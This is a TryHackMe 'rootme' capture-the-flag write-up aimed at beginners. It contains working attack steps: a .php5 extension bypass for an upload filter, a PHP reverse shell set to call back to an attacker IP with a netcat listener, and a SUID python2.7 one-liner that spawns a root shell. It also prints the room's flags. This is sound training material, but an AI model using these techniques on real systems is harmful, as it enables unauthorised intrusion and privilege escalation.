# TryHackMe CTF

> This write-up has been reformatted using AI from my orginial notes for clarity and better viewing

## Machine Information

| Field            | Details    |
| ---------------- | ---------- |
| **Machine Name** | rootme     |
| **Date**         | 2/19/2026  |
| **Completed**    | 2/19/2026  |
| **Attacker OS**  | Kali Linux |
| **Difficulty**   | Easy       |

---

## Room Questions

### Task 2: Reconnaissance

| Question                                      | Answer    |
| --------------------------------------------- | --------- |
| Scan the machine, how many ports are open?    | `2`       |
| What version of Apache is running?            | `2.4.41`  |
| What service is running on port 22?           | `ssh`     |
| Using Gobuster, what is the hidden directory? | `/panel/` |

### Task 3: Getting a Shell

| Question                        | Answer                 |
| ------------------------------- | ---------------------- |
| What is the flag in `user.txt`? | `THM{y0u_g0t_a_sh3ll}` |

### Task 4: Privilege Escalation

| Question                                                    | Answer                      |
| ----------------------------------------------------------- | --------------------------- |
| Search for files with SUID permission, which file is weird? | `/usr/bin/python`           |
| Escalate privs and what is the flag in `root.txt`?          | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -vv -oN nmapscan.txt 10.64.189.186
```

### Nmap Output

```bash
Nmap scan report for 10.64.189.186
Host is up, received echo-reply ttl 62 (0.025s latency).
Scanned at 2026-02-19 11:52:04 EST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 51:d7:b0:2d:07:3c:0f:2b:f1:02:55:10:0a:69:83:de (RSA)
|   256 39:8e:aa:cf:ac:f3:2a:38:58:e6:fb:fc:d5:1f:5d:34 (ECDSA)
|_  256 38:a0:5f:f8:00:ba:c0:f6:ba:8b:27:73:df:6e:69:28 (ED25519)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Scan Summary

**Scan Date:** 2026-02-19 at 11:52:04 EST | **Duration:** 21 seconds | **Host Status:** Up (latency: 0.025s, TTL: 62)

#### Open Ports

| Port   | State | Service | Version                          |
| ------ | ----- | ------- | -------------------------------- |
| 22/tcp | Open  | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | Open  | HTTP    | Apache httpd 2.4.41 (Ubuntu)     |

> 65,533 closed TCP ports not shown (all returned reset)

#### Port 22 — SSH

**Service:** OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| Key Type | Bits | Fingerprint                                       |
| -------- | ---- | ------------------------------------------------- |
| RSA      | 3072 | `51:d7:b0:2d:07:3c:0f:2b:f1:02:55:10:0a:69:83:de` |
| ECDSA    | 256  | `39:8e:aa:cf:ac:f3:2a:38:58:e6:fb:fc:d5:1f:5d:34` |
| ED25519  | 256  | `38:a0:5f:f8:00:ba:c0:f6:ba:8b:27:73:df:6e:69:28` |

#### Port 80 — HTTP

**Service:** Apache httpd 2.4.41 (Ubuntu) | **Page Title:** HackIT - Home | **Server Header:** `Apache/2.4.41 (Ubuntu)`

Supported Methods: `GET` `HEAD` `POST` `OPTIONS`

| Cookie Path | Cookie    | Issue                   |
| ----------- | --------- | ----------------------- |
| `/`         | PHPSESSID | `httponly` flag not set |

**Notes:**

- Port 80 is running a site called **HackIT** — likely the main attack surface.
- SSH is available but will likely require credentials or a key found elsewhere on the box.

---

### Web Enumeration

```bash
gobuster dir -u http://10.64.189.186 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -o gobuster.txt
```

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.189.186
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
css                  (Status: 301) [Size: 312] [--> http://10.64.189.186/css/]
uploads              (Status: 301) [Size: 316] [--> http://10.64.189.186/uploads/]
index.php            (Status: 200) [Size: 616]
panel                (Status: 301) [Size: 314] [--> http://10.64.189.186/panel/]
js                   (Status: 301) [Size: 311] [--> http://10.64.189.186/js/]
server-status        (Status: 403) [Size: 278]
Progress: 119996 / 119996 (100.00%)
===============================================================
Finished
===============================================================
```

### Directory Analysis

- **`/css`** — Just CSS files, nothing of value.
- **`/uploads`** — An empty directory that stores uploaded files.
- **`/panel`** — An exposed page that allows direct uploads. This is where we can upload our reverse shell.
- **`/js`** — An open directory hosting `maquina_de_escrever.js` (translates to `typewriter.js`).

`maquina_de_escrever.js`:

```javascript
function typeWrite(element) {
  const textArray = element.innerHTML.split("");
  element.innerHTML = " ";
  textArray.forEach(function (letter, i) {
    setTimeout(function () {
      element.innerHTML += letter;
    }, 75 * i);
  });
}
```

`index.php`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/home.css" />
    <script src="js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
  </head>
  <body>
    <div class="main-div">
      <p class="title">root@rootme:~#</p>
      <p class="description">Can you root me?</p>
    </div>
    <script>
      const titulo = document.querySelector(".title");
      typeWrite(titulo);
    </script>
  </body>
</html>
```

Based on the above, `/panel/` is where the magic happens.

![panel]!(https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/rootme1.png)

---

## 2. Achieving a Reverse Shell

The PHP reverse shell used: [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Attempting to upload the reverse shell via `/panel/` fails — `.php` files are blocked.

![fail]!(https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/rootme2.png)

After some research, PHP supports alternative extensions: `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`. Renaming the file to `.php5` bypasses the filter.

Before uploading, update the shell config:

```php
$ip = '192.168.133.88';  // Your attacker IP
$port = 4242;            // Your listener port
```

> **Note:** Check your UFW rules if running your own attackbox.

The upload succeeds, and the file appears in `/uploads/`. Start a listener and trigger the shell by visiting the uploaded file:

![upload](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/rootme3.png)

```bash
sudo nc -lvnp 4242
```

### Shell Obtained

```bash
connect to [192.168.133.88] from (UNKNOWN) [10.65.135.174] 54714
Linux ip-10-65-135-174 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### Finding `user.txt`

```bash
find / -type f -name "user.txt" 2>/dev/null
```

```bash
/var/www/user.txt
```

```bash
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## 3. Privilege Escalation

Find files with the SUID bit set:

```bash
find / -type f -perm -4000 2>/dev/null
```

```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7        <-- unusual!
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
```

`/usr/bin/python2.7` stands out — a Python binary with SUID set as root is not normal. Confirm:

```bash
$ ls -l /usr/bin/python2.7
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
```

Exploit it to spawn a root shell:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
whoami
root
```

### Finding `root.txt`

```bash
find / -type f -name "root.txt" 2>/dev/null
```

```bash
/root/root.txt
```

```bash
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

---

> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.

---

## Key Takeaways for Beginners

### 1. Always Start with a Port Scan

The first thing you do when attacking a machine is find out what's running on it. **Nmap** is the standard tool for this. It tells you which ports are open and what services are listening on them. In this room, we found two: SSH on port 22 and a web server on port 80. The web server became our way in.

> Think of ports like doors on a building — Nmap tells you which ones are open and what's behind them.

---

### 2. Directory Busting Finds Hidden Pages

Websites often have pages that aren't linked anywhere publicly. Tools like **Gobuster** brute-force common directory and file names to discover them. Here, we found `/panel/` — an upload page that the site owner probably didn't intend to be exposed. Without this step, we'd have had no way in.

> If a door isn't listed, it doesn't mean it doesn't exist. Gobuster checks them all.

---

### 3. File Upload Filters Can Often Be Bypassed

The site blocked `.php` file uploads, but PHP actually runs under several other extensions like `.php5`. This is a classic **file upload bypass** — the filter was checking the extension but not the actual file content. Always try alternate extensions when a file type is blocked.

> Security filters that only check the filename are easy to trick. Good filters check the actual file contents too.

---

### 4. A Reverse Shell Gives You Remote Code Execution

A **reverse shell** is a script that, when executed on a target machine, connects _back_ to your machine and gives you a command prompt. We uploaded one disguised as a `.php5` file, then used `netcat` (`nc`) to listen for the incoming connection. Once the server ran our file, we had a live shell on the machine.

> Instead of knocking on the target's door, you make the target call _you_.

---

### 5. SUID Binaries Are a Common Priv Esc Vector

**SUID** (Set User ID) is a Linux permission that allows a program to run as its owner — often root — regardless of who executes it. When a program like Python has SUID set as root, you can use it to run commands _as root_. This is a well-known privilege escalation technique and is frequently misconfigured on CTF machines (and sometimes real ones).

> Finding an SUID binary you can abuse is like finding a master key left in the wrong hands.

---

### 6. `find` Is Your Best Friend

The `find` command was used twice in this room — once to locate `user.txt` and again to find SUID binaries. Learning to use `find` effectively is a core skill in CTFs and real-world pentesting.

```bash
# Find a specific file anywhere on the system
find / -type f -name "filename.txt" 2>/dev/null

# Find all SUID binaries
find / -type f -perm -4000 2>/dev/null
```

The `2>/dev/null` part just hides error messages so your output stays clean.

---

### 7. GTFOBins Is Your Go-To Reference

When you find a SUID binary, check **[GTFOBins](https://gtfobins.github.io/)** — a curated list of Unix binaries that can be abused for privilege escalation, shell escapes, and more. If a binary is on that list and has SUID set, there's likely a one-liner to get a root shell.

---

### Tools Used in This Room

| Tool              | Purpose                                 |
| ----------------- | --------------------------------------- |
| `nmap`            | Port scanning and service detection     |
| `gobuster`        | Web directory and file enumeration      |
| `netcat (nc)`     | Listening for reverse shell connections |
| `find`            | Locating files and SUID binaries        |
| PHP reverse shell | Remote code execution payload           |
| GTFOBins          | Reference for SUID/sudo exploitation    |

---
> This write-up was created by `saintmichael`
